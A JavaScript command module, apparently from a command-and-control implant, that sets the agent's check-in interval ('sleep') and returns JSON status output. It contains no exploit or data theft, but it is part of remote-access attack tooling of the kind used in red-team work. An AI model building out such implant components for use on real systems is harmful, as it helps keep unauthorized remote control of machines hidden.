exports.sleep = function(task, command, params){
    try{
        let temp_time = parseInt(params);
        if(isNaN(temp_time)){
            return JSON.stringify({"user_output":"Failed to update sleep time in seconds to: " + params, "completed": true, "status": "error"});
        }
        if(temp_time < 0){
            temp_time = temp_time * -1;
        }
        C2.interval = temp_time;
        return JSON.stringify({"user_output":"Sleep updated to: " + C2.interval, "completed": true});
    }catch(error){
        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
    }
};

COMMAND_ENDS_HERE